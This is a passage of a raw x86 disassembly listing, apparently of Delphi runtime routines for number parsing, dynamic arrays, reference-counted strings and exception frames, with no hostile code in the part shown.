  404269:	45                   	inc    %ebp
  40426a:	80 7c 2e ff 20       	cmpb   $0x20,-0x1(%esi,%ebp,1)
  40426f:	74 f8                	je     0x404269
  404271:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  404276:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  40427a:	3c 2d                	cmp    $0x2d,%al
  40427c:	75 08                	jne    0x404286
  40427e:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  404283:	45                   	inc    %ebp
  404284:	eb 05                	jmp    0x40428b
  404286:	3c 2b                	cmp    $0x2b,%al
  404288:	75 01                	jne    0x40428b
  40428a:	45                   	inc    %ebp
  40428b:	b3 01                	mov    $0x1,%bl
  40428d:	80 7c 2e ff 24       	cmpb   $0x24,-0x1(%esi,%ebp,1)
  404292:	74 28                	je     0x4042bc
  404294:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  404298:	e8 ab e8 ff ff       	call   0x402b48
  40429d:	3c 58                	cmp    $0x58,%al
  40429f:	74 1b                	je     0x4042bc
  4042a1:	80 7c 2e ff 30       	cmpb   $0x30,-0x1(%esi,%ebp,1)
  4042a6:	0f 85 d4 00 00 00    	jne    0x404380
  4042ac:	8a 04 2e             	mov    (%esi,%ebp,1),%al
  4042af:	e8 94 e8 ff ff       	call   0x402b48
  4042b4:	3c 58                	cmp    $0x58,%al
  4042b6:	0f 85 c4 00 00 00    	jne    0x404380
  4042bc:	80 7c 2e ff 30       	cmpb   $0x30,-0x1(%esi,%ebp,1)
  4042c1:	75 01                	jne    0x4042c4
  4042c3:	45                   	inc    %ebp
  4042c4:	45                   	inc    %ebp
  4042c5:	8a 4c 2e ff          	mov    -0x1(%esi,%ebp,1),%cl
  4042c9:	8b c1                	mov    %ecx,%eax
  4042cb:	04 d0                	add    $0xd0,%al
  4042cd:	2c 0a                	sub    $0xa,%al
  4042cf:	72 0e                	jb     0x4042df
  4042d1:	04 f9                	add    $0xf9,%al
  4042d3:	2c 06                	sub    $0x6,%al
  4042d5:	72 15                	jb     0x4042ec
  4042d7:	04 e6                	add    $0xe6,%al
  4042d9:	2c 06                	sub    $0x6,%al
  4042db:	72 1c                	jb     0x4042f9
  4042dd:	eb 7a                	jmp    0x404359
  4042df:	8b f9                	mov    %ecx,%edi
  4042e1:	81 e7 ff 00 00 00    	and    $0xff,%edi
  4042e7:	83 ef 30             	sub    $0x30,%edi
  4042ea:	eb 18                	jmp    0x404304
  4042ec:	8b f9                	mov    %ecx,%edi
  4042ee:	81 e7 ff 00 00 00    	and    $0xff,%edi
  4042f4:	83 ef 37             	sub    $0x37,%edi
  4042f7:	eb 0b                	jmp    0x404304
  4042f9:	8b f9                	mov    %ecx,%edi
  4042fb:	81 e7 ff 00 00 00    	and    $0xff,%edi
  404301:	83 ef 57             	sub    $0x57,%edi
  404304:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  404309:	75 09                	jne    0x404314
  40430b:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  404310:	72 47                	jb     0x404359
  404312:	eb 02                	jmp    0x404316
  404314:	7c 43                	jl     0x404359
  404316:	81 7c 24 0c ff ff ff 	cmpl   $0xfffffff,0xc(%esp)
  40431d:	0f 
  40431e:	75 09                	jne    0x404329
  404320:	83 7c 24 08 ff       	cmpl   $0xffffffff,0x8(%esp)
  404325:	76 04                	jbe    0x40432b
  404327:	eb 30                	jmp    0x404359
  404329:	7f 2e                	jg     0x404359
  40432b:	8b c7                	mov    %edi,%eax
  40432d:	99                   	cltd
  40432e:	52                   	push   %edx
  40432f:	50                   	push   %eax
  404330:	8b 44 24 10          	mov    0x10(%esp),%eax
  404334:	8b 54 24 14          	mov    0x14(%esp),%edx
  404338:	0f a4 c2 04          	shld   $0x4,%eax,%edx
  40433c:	c1 e0 04             	shl    $0x4,%eax
  40433f:	03 04 24             	add    (%esp),%eax
  404342:	13 54 24 04          	adc    0x4(%esp),%edx
  404346:	83 c4 08             	add    $0x8,%esp
  404349:	89 44 24 08          	mov    %eax,0x8(%esp)
  40434d:	89 54 24 0c          	mov    %edx,0xc(%esp)
  404351:	45                   	inc    %ebp
  404352:	33 db                	xor    %ebx,%ebx
  404354:	e9 6c ff ff ff       	jmp    0x4042c5
  404359:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  40435e:	0f 84 cc 00 00 00    	je     0x404430
  404364:	8b 44 24 08          	mov    0x8(%esp),%eax
  404368:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40436c:	f7 d8                	neg    %eax
  40436e:	83 d2 00             	adc    $0x0,%edx
  404371:	f7 da                	neg    %edx
  404373:	89 44 24 08          	mov    %eax,0x8(%esp)
  404377:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40437b:	e9 b0 00 00 00       	jmp    0x404430
  404380:	8a 44 2e ff          	mov    -0x1(%esi,%ebp,1),%al
  404384:	04 d0                	add    $0xd0,%al
  404386:	2c 0a                	sub    $0xa,%al
  404388:	73 5f                	jae    0x4043e9
  40438a:	0f b6 7c 2e ff       	movzbl -0x1(%esi,%ebp,1),%edi
  40438f:	83 ef 30             	sub    $0x30,%edi
  404392:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  404397:	75 09                	jne    0x4043a2
  404399:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40439e:	72 49                	jb     0x4043e9
  4043a0:	eb 02                	jmp    0x4043a4
  4043a2:	7c 45                	jl     0x4043e9
  4043a4:	81 7c 24 0c cc cc cc 	cmpl   $0xccccccc,0xc(%esp)
  4043ab:	0c 
  4043ac:	75 0c                	jne    0x4043ba
  4043ae:	81 7c 24 08 cc cc cc 	cmpl   $0xcccccccc,0x8(%esp)
  4043b5:	cc 
  4043b6:	76 04                	jbe    0x4043bc
  4043b8:	eb 2f                	jmp    0x4043e9
  4043ba:	7f 2d                	jg     0x4043e9
  4043bc:	6a 00                	push   $0x0
  4043be:	6a 0a                	push   $0xa
  4043c0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4043c4:	8b 54 24 14          	mov    0x14(%esp),%edx
  4043c8:	e8 47 fe ff ff       	call   0x404214
  4043cd:	52                   	push   %edx
  4043ce:	50                   	push   %eax
  4043cf:	8b c7                	mov    %edi,%eax
  4043d1:	99                   	cltd
  4043d2:	03 04 24             	add    (%esp),%eax
  4043d5:	13 54 24 04          	adc    0x4(%esp),%edx
  4043d9:	83 c4 08             	add    $0x8,%esp
  4043dc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4043e0:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4043e4:	45                   	inc    %ebp
  4043e5:	33 db                	xor    %ebx,%ebx
  4043e7:	eb 97                	jmp    0x404380
  4043e9:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  4043ee:	74 17                	je     0x404407
  4043f0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4043f4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4043f8:	f7 d8                	neg    %eax
  4043fa:	83 d2 00             	adc    $0x0,%edx
  4043fd:	f7 da                	neg    %edx
  4043ff:	89 44 24 08          	mov    %eax,0x8(%esp)
  404403:	89 54 24 0c          	mov    %edx,0xc(%esp)
  404407:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40440c:	75 05                	jne    0x404413
  40440e:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  404413:	74 1b                	je     0x404430
  404415:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40441a:	75 0a                	jne    0x404426
  40441c:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  404421:	0f 92 c0             	setb   %al
  404424:	eb 03                	jmp    0x404429
  404426:	0f 9c c0             	setl   %al
  404429:	3a 44 24 10          	cmp    0x10(%esp),%al
  40442d:	74 01                	je     0x404430
  40442f:	4d                   	dec    %ebp
  404430:	80 7c 2e ff 00       	cmpb   $0x0,-0x1(%esi,%ebp,1)
  404435:	0f 95 c0             	setne  %al
  404438:	0a d8                	or     %al,%bl
  40443a:	74 07                	je     0x404443
  40443c:	8b 04 24             	mov    (%esp),%eax
  40443f:	89 28                	mov    %ebp,(%eax)
  404441:	eb 07                	jmp    0x40444a
  404443:	8b 04 24             	mov    (%esp),%eax
  404446:	33 d2                	xor    %edx,%edx
  404448:	89 10                	mov    %edx,(%eax)
  40444a:	8b 44 24 08          	mov    0x8(%esp),%eax
  40444e:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404452:	83 c4 14             	add    $0x14,%esp
  404455:	5d                   	pop    %ebp
  404456:	5f                   	pop    %edi
  404457:	5e                   	pop    %esi
  404458:	5b                   	pop    %ebx
  404459:	c3                   	ret
  40445a:	8b c0                	mov    %eax,%eax
  40445c:	85 c0                	test   %eax,%eax
  40445e:	74 03                	je     0x404463
  404460:	8b 40 fc             	mov    -0x4(%eax),%eax
  404463:	c3                   	ret
  404464:	e8 f3 ff ff ff       	call   0x40445c
  404469:	48                   	dec    %eax
  40446a:	c3                   	ret
  40446b:	90                   	nop
  40446c:	55                   	push   %ebp
  40446d:	8b ec                	mov    %esp,%ebp
  40446f:	ff 75 08             	push   0x8(%ebp)
  404472:	e8 a1 fc ff ff       	call   0x404118
  404477:	5d                   	pop    %ebp
  404478:	c2 04 00             	ret    $0x4
  40447b:	90                   	nop
  40447c:	e9 6f f9 ff ff       	jmp    0x403df0
  404481:	c3                   	ret
  404482:	8b c0                	mov    %eax,%eax
  404484:	e8 bb 01 00 00       	call   0x404644
  404489:	c3                   	ret
  40448a:	8b c0                	mov    %eax,%eax
  40448c:	55                   	push   %ebp
  40448d:	8b ec                	mov    %esp,%ebp
  40448f:	83 c4 e4             	add    $0xffffffe4,%esp
  404492:	53                   	push   %ebx
  404493:	56                   	push   %esi
  404494:	57                   	push   %edi
  404495:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404498:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40449b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40449e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044a1:	8b 00                	mov    (%eax),%eax
  4044a3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4044a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4044a9:	8b 18                	mov    (%eax),%ebx
  4044ab:	85 db                	test   %ebx,%ebx
  4044ad:	7f 1b                	jg     0x4044ca
  4044af:	85 db                	test   %ebx,%ebx
  4044b1:	7d 07                	jge    0x4044ba
  4044b3:	b0 04                	mov    $0x4,%al
  4044b5:	e8 6a e4 ff ff       	call   0x402924
  4044ba:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044bd:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4044c0:	e8 bf ff ff ff       	call   0x404484
  4044c5:	e9 63 01 00 00       	jmp    0x40462d
  4044ca:	33 ff                	xor    %edi,%edi
  4044cc:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4044d0:	74 0d                	je     0x4044df
  4044d2:	83 6d e8 04          	subl   $0x4,-0x18(%ebp)
  4044d6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4044d9:	8b 38                	mov    (%eax),%edi
  4044db:	83 6d e8 04          	subl   $0x4,-0x18(%ebp)
  4044df:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4044e2:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4044e6:	01 45 f8             	add    %eax,-0x8(%ebp)
  4044e9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4044ec:	8b 70 02             	mov    0x2(%eax),%esi
  4044ef:	8b 50 06             	mov    0x6(%eax),%edx
  4044f2:	85 d2                	test   %edx,%edx
  4044f4:	74 07                	je     0x4044fd
  4044f6:	8b 02                	mov    (%edx),%eax
  4044f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4044fb:	eb 05                	jmp    0x404502
  4044fd:	33 c0                	xor    %eax,%eax
  4044ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404502:	8b c3                	mov    %ebx,%eax
  404504:	f7 ee                	imul   %esi
  404506:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404509:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40450c:	99                   	cltd
  40450d:	f7 fb                	idiv   %ebx
  40450f:	3b f0                	cmp    %eax,%esi
  404511:	74 07                	je     0x40451a
  404513:	b0 04                	mov    $0x4,%al
  404515:	e8 0a e4 ff ff       	call   0x402924
  40451a:	83 45 ec 08          	addl   $0x8,-0x14(%ebp)
  40451e:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404522:	74 08                	je     0x40452c
  404524:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404527:	83 38 01             	cmpl   $0x1,(%eax)
  40452a:	75 3c                	jne    0x404568
  40452c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40452f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404532:	3b fb                	cmp    %ebx,%edi
  404534:	7e 1f                	jle    0x404555
  404536:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40453a:	74 19                	je     0x404555
  40453c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40453f:	83 c0 08             	add    $0x8,%eax
  404542:	8b d3                	mov    %ebx,%edx
  404544:	0f af d6             	imul   %esi,%edx
  404547:	03 c2                	add    %edx,%eax
  404549:	8b cf                	mov    %edi,%ecx
  40454b:	2b cb                	sub    %ebx,%ecx
  40454d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404550:	e8 27 ff ff ff       	call   0x40447c
  404555:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404558:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40455b:	e8 1c e3 ff ff       	call   0x40287c
  404560:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404563:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404566:	eb 63                	jmp    0x4045cb
  404568:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40456b:	ff 08                	decl   (%eax)
  40456d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404570:	e8 b7 e2 ff ff       	call   0x40282c
  404575:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404578:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40457b:	3b 5d f0             	cmp    -0x10(%ebp),%ebx
  40457e:	7d 03                	jge    0x404583
  404580:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404583:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404587:	74 2c                	je     0x4045b5
  404589:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40458c:	0f af d6             	imul   %esi,%edx
  40458f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404592:	83 c0 08             	add    $0x8,%eax
  404595:	33 c9                	xor    %ecx,%ecx
  404597:	e8 10 e6 ff ff       	call   0x402bac
  40459c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40459f:	50                   	push   %eax
  4045a0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4045a3:	8b 12                	mov    (%edx),%edx
  4045a5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4045a8:	83 c0 08             	add    $0x8,%eax
  4045ab:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4045ae:	e8 b9 fe ff ff       	call   0x40446c
  4045b3:	eb 16                	jmp    0x4045cb
  4045b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4045b8:	0f af ce             	imul   %esi,%ecx
  4045bb:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4045be:	83 c2 08             	add    $0x8,%edx
  4045c1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4045c4:	8b 00                	mov    (%eax),%eax
  4045c6:	e8 75 e3 ff ff       	call   0x402940
  4045cb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4045ce:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4045d4:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4045d8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4045db:	89 18                	mov    %ebx,(%eax)
  4045dd:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4045e1:	8b d3                	mov    %ebx,%edx
  4045e3:	2b d7                	sub    %edi,%edx
  4045e5:	0f af d6             	imul   %esi,%edx
  4045e8:	8b c6                	mov    %esi,%eax
  4045ea:	0f af c7             	imul   %edi,%eax
  4045ed:	03 45 e8             	add    -0x18(%ebp),%eax
  4045f0:	33 c9                	xor    %ecx,%ecx
  4045f2:	e8 b5 e5 ff ff       	call   0x402bac
  4045f7:	83 7d f4 01          	cmpl   $0x1,-0xc(%ebp)
  4045fb:	7e 28                	jle    0x404625
  4045fd:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  404601:	ff 4d f4             	decl   -0xc(%ebp)
  404604:	4b                   	dec    %ebx
  404605:	85 db                	test   %ebx,%ebx
  404607:	7c 1c                	jl     0x404625
  404609:	43                   	inc    %ebx
  40460a:	33 f6                	xor    %esi,%esi
  40460c:	8b 45 08             	mov    0x8(%ebp),%eax
  40460f:	50                   	push   %eax
  404610:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404613:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  404616:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404619:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40461c:	e8 6b fe ff ff       	call   0x40448c
  404621:	46                   	inc    %esi
  404622:	4b                   	dec    %ebx
  404623:	75 e7                	jne    0x40460c
  404625:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404628:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40462b:	89 10                	mov    %edx,(%eax)
  40462d:	5f                   	pop    %edi
  40462e:	5e                   	pop    %esi
  40462f:	5b                   	pop    %ebx
  404630:	8b e5                	mov    %ebp,%esp
  404632:	5d                   	pop    %ebp
  404633:	c2 04 00             	ret    $0x4
  404636:	8b c0                	mov    %eax,%eax
  404638:	54                   	push   %esp
  404639:	83 04 24 04          	addl   $0x4,(%esp)
  40463d:	e8 4a fe ff ff       	call   0x40448c
  404642:	c3                   	ret
  404643:	90                   	nop
  404644:	8b 08                	mov    (%eax),%ecx
  404646:	85 c9                	test   %ecx,%ecx
  404648:	74 33                	je     0x40467d
  40464a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  404650:	f0 ff 49 f8          	lock decl -0x8(%ecx)
  404654:	75 27                	jne    0x40467d
  404656:	50                   	push   %eax
  404657:	89 c8                	mov    %ecx,%eax
  404659:	31 c9                	xor    %ecx,%ecx
  40465b:	8a 4a 01             	mov    0x1(%edx),%cl
  40465e:	8b 54 11 06          	mov    0x6(%ecx,%edx,1),%edx
  404662:	85 d2                	test   %edx,%edx
  404664:	74 0e                	je     0x404674
  404666:	8b 48 fc             	mov    -0x4(%eax),%ecx
  404669:	85 c9                	test   %ecx,%ecx
  40466b:	74 07                	je     0x404674
  40466d:	8b 12                	mov    (%edx),%edx
  40466f:	e8 7c f7 ff ff       	call   0x403df0
  404674:	83 e8 08             	sub    $0x8,%eax
  404677:	e8 e0 e1 ff ff       	call   0x40285c
  40467c:	58                   	pop    %eax
  40467d:	c3                   	ret
  40467e:	8b c0                	mov    %eax,%eax
  404680:	53                   	push   %ebx
  404681:	8b 18                	mov    (%eax),%ebx
  404683:	85 d2                	test   %edx,%edx
  404685:	74 04                	je     0x40468b
  404687:	f0 ff 42 f8          	lock incl -0x8(%edx)
  40468b:	85 db                	test   %ebx,%ebx
  40468d:	74 14                	je     0x4046a3
  40468f:	f0 ff 4b f8          	lock decl -0x8(%ebx)
  404693:	75 0e                	jne    0x4046a3
  404695:	50                   	push   %eax
  404696:	52                   	push   %edx
  404697:	89 ca                	mov    %ecx,%edx
  404699:	ff 43 f8             	incl   -0x8(%ebx)
  40469c:	e8 a3 ff ff ff       	call   0x404644
  4046a1:	5a                   	pop    %edx
  4046a2:	58                   	pop    %eax
  4046a3:	89 10                	mov    %edx,(%eax)
  4046a5:	5b                   	pop    %ebx
  4046a6:	c3                   	ret
  4046a7:	90                   	nop
  4046a8:	85 c0                	test   %eax,%eax
  4046aa:	74 04                	je     0x4046b0
  4046ac:	f0 ff 40 f8          	lock incl -0x8(%eax)
  4046b0:	c3                   	ret
  4046b1:	8d 40 00             	lea    0x0(%eax),%eax
  4046b4:	55                   	push   %ebp
  4046b5:	8b ec                	mov    %esp,%ebp
  4046b7:	83 c4 f8             	add    $0xfffffff8,%esp
  4046ba:	53                   	push   %ebx
  4046bb:	56                   	push   %esi
  4046bc:	57                   	push   %edi
  4046bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046c0:	a1 2c a0 40 00       	mov    0x40a02c,%eax
  4046c5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4046c8:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4046cc:	74 39                	je     0x404707
  4046ce:	33 c0                	xor    %eax,%eax
  4046d0:	55                   	push   %ebp
  4046d1:	68 ef 46 40 00       	push   $0x4046ef
  4046d6:	64 ff 30             	push   %fs:(%eax)
  4046d9:	64 89 20             	mov    %esp,%fs:(%eax)
  4046dc:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4046df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046e2:	ff 53 04             	call   *0x4(%ebx)
  4046e5:	33 c0                	xor    %eax,%eax
  4046e7:	5a                   	pop    %edx
  4046e8:	59                   	pop    %ecx
  4046e9:	59                   	pop    %ecx
  4046ea:	64 89 10             	mov    %edx,%fs:(%eax)
  4046ed:	eb 0a                	jmp    0x4046f9
  4046ef:	e9 a4 e9 ff ff       	jmp    0x403098
  4046f4:	e8 57 eb ff ff       	call   0x403250
  4046f9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4046fc:	8b 00                	mov    (%eax),%eax
  4046fe:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404701:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404705:	75 c7                	jne    0x4046ce
  404707:	5f                   	pop    %edi
  404708:	5e                   	pop    %esi
  404709:	5b                   	pop    %ebx
  40470a:	59                   	pop    %ecx
  40470b:	59                   	pop    %ecx
  40470c:	5d                   	pop    %ebp
  40470d:	c3                   	ret
  40470e:	8b c0                	mov    %eax,%eax
  404710:	8b 15 28 a0 40 00    	mov    0x40a028,%edx
  404716:	89 10                	mov    %edx,(%eax)
  404718:	a3 28 a0 40 00       	mov    %eax,0x40a028
  40471d:	c3                   	ret
  40471e:	8b c0                	mov    %eax,%eax
  404720:	55                   	push   %ebp
  404721:	8b ec                	mov    %esp,%ebp
  404723:	83 c4 f8             	add    $0xfffffff8,%esp
  404726:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404729:	33 c0                	xor    %eax,%eax
  40472b:	55                   	push   %ebp
  40472c:	68 99 47 40 00       	push   $0x404799
  404731:	64 ff 30             	push   %fs:(%eax)
  404734:	64 89 20             	mov    %esp,%fs:(%eax)
  404737:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40473a:	8b 40 04             	mov    0x4(%eax),%eax
  40473d:	e8 72 ff ff ff       	call   0x4046b4
  404742:	33 c0                	xor    %eax,%eax
  404744:	5a                   	pop    %edx
  404745:	59                   	pop    %ecx
  404746:	59                   	pop    %ecx
  404747:	64 89 10             	mov    %edx,%fs:(%eax)
  40474a:	68 a0 47 40 00       	push   $0x4047a0
  40474f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404752:	3b 05 28 a0 40 00    	cmp    0x40a028,%eax
  404758:	75 0c                	jne    0x404766
  40475a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40475d:	8b 00                	mov    (%eax),%eax
  40475f:	a3 28 a0 40 00       	mov    %eax,0x40a028
  404764:	eb 32                	jmp    0x404798
  404766:	a1 28 a0 40 00       	mov    0x40a028,%eax
  40476b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40476e:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404772:	74 24                	je     0x404798
  404774:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404777:	8b 00                	mov    (%eax),%eax
  404779:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40477c:	75 0c                	jne    0x40478a
  40477e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404781:	8b 00                	mov    (%eax),%eax
  404783:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404786:	89 02                	mov    %eax,(%edx)
  404788:	eb 0e                	jmp    0x404798
  40478a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40478d:	8b 00                	mov    (%eax),%eax
  40478f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404792:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404796:	75 dc                	jne    0x404774
  404798:	c3                   	ret
  404799:	e9 26 ea ff ff       	jmp    0x4031c4
  40479e:	eb af                	jmp    0x40474f
  4047a0:	59                   	pop    %ecx
  4047a1:	59                   	pop    %ecx
  4047a2:	5d                   	pop    %ebp
  4047a3:	c3                   	ret
  4047a4:	8b 10                	mov    (%eax),%edx
  4047a6:	85 d2                	test   %edx,%edx
  4047a8:	74 0e                	je     0x4047b8
  4047aa:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4047b0:	50                   	push   %eax
  4047b1:	52                   	push   %edx
  4047b2:	8b 02                	mov    (%edx),%eax
  4047b4:	ff 50 08             	call   *0x8(%eax)
  4047b7:	58                   	pop    %eax
  4047b8:	c3                   	ret
  4047b9:	8d 40 00             	lea    0x0(%eax),%eax
  4047bc:	85 d2                	test   %edx,%edx
  4047be:	74 19                	je     0x4047d9
  4047c0:	52                   	push   %edx
  4047c1:	50                   	push   %eax
  4047c2:	8b 02                	mov    (%edx),%eax
  4047c4:	52                   	push   %edx
  4047c5:	ff 50 04             	call   *0x4(%eax)
  4047c8:	58                   	pop    %eax
  4047c9:	8b 08                	mov    (%eax),%ecx
  4047cb:	8f 00                	pop    (%eax)
  4047cd:	85 c9                	test   %ecx,%ecx
  4047cf:	75 01                	jne    0x4047d2
  4047d1:	c3                   	ret
  4047d2:	8b 01                	mov    (%ecx),%eax
  4047d4:	51                   	push   %ecx
  4047d5:	ff 50 08             	call   *0x8(%eax)
  4047d8:	c3                   	ret
  4047d9:	8b 08                	mov    (%eax),%ecx
  4047db:	85 c9                	test   %ecx,%ecx
  4047dd:	89 10                	mov    %edx,(%eax)
  4047df:	74 06                	je     0x4047e7
  4047e1:	8b 01                	mov    (%ecx),%eax
  4047e3:	51                   	push   %ecx
  4047e4:	ff 50 08             	call   *0x8(%eax)
  4047e7:	c3                   	ret
  4047e8:	85 c0                	test   %eax,%eax
  4047ea:	74 06                	je     0x4047f2
  4047ec:	50                   	push   %eax
  4047ed:	8b 00                	mov    (%eax),%eax
  4047ef:	ff 50 04             	call   *0x4(%eax)
  4047f2:	c3                   	ret
  4047f3:	90                   	nop
  4047f4:	55                   	push   %ebp
  4047f5:	8b ec                	mov    %esp,%ebp
  4047f7:	83 c4 f0             	add    $0xfffffff0,%esp
  4047fa:	53                   	push   %ebx
  4047fb:	33 d2                	xor    %edx,%edx
  4047fd:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404800:	33 d2                	xor    %edx,%edx
  404802:	55                   	push   %ebp
  404803:	68 5a 48 40 00       	push   $0x40485a
  404808:	64 ff 32             	push   %fs:(%edx)
  40480b:	64 89 22             	mov    %esp,%fs:(%edx)
  40480e:	6a 07                	push   $0x7
  404810:	8d 55 f5             	lea    -0xb(%ebp),%edx
  404813:	52                   	push   %edx
  404814:	68 04 10 00 00       	push   $0x1004
  404819:	50                   	push   %eax
  40481a:	e8 91 c8 ff ff       	call   0x4010b0
  40481f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404822:	8d 55 f5             	lea    -0xb(%ebp),%edx
  404825:	b9 07 00 00 00       	mov    $0x7,%ecx
  40482a:	e8 7d f0 ff ff       	call   0x4038ac
  40482f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404832:	8d 55 fc             	lea    -0x4(%ebp),%edx
  404835:	e8 92 e3 ff ff       	call   0x402bcc
  40483a:	8b d8                	mov    %eax,%ebx
  40483c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404840:	74 02                	je     0x404844
  404842:	33 db                	xor    %ebx,%ebx
  404844:	33 c0                	xor    %eax,%eax
  404846:	5a                   	pop    %edx
  404847:	59                   	pop    %ecx
  404848:	59                   	pop    %ecx
  404849:	64 89 10             	mov    %edx,%fs:(%eax)
  40484c:	68 61 48 40 00       	push   $0x404861
  404851:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404854:	e8 f7 ee ff ff       	call   0x403750
  404859:	c3                   	ret
  40485a:	e9 65 e9 ff ff       	jmp    0x4031c4
  40485f:	eb f0                	jmp    0x404851
  404861:	8b c3                	mov    %ebx,%eax
  404863:	5b                   	pop    %ebx
  404864:	8b e5                	mov    %ebp,%esp
  404866:	5d                   	pop    %ebp
  404867:	c3                   	ret
  404868:	55                   	push   %ebp
  404869:	8b ec                	mov    %esp,%ebp
  40486b:	33 c0                	xor    %eax,%eax
  40486d:	55                   	push   %ebp
  40486e:	68 b2 48 40 00       	push   $0x4048b2
  404873:	64 ff 30             	push   %fs:(%eax)
  404876:	64 89 20             	mov    %esp,%fs:(%eax)
  404879:	ff 05 a4 b5 40 00    	incl   0x40b5a4
  40487f:	75 23                	jne    0x4048a4
  404881:	b8 38 b0 40 00       	mov    $0x40b038,%eax
  404886:	e8 c9 e2 ff ff       	call   0x402b54
  40488b:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  404890:	e8 bf e2 ff ff       	call   0x402b54
  404895:	b8 d0 b3 40 00       	mov    $0x40b3d0,%eax
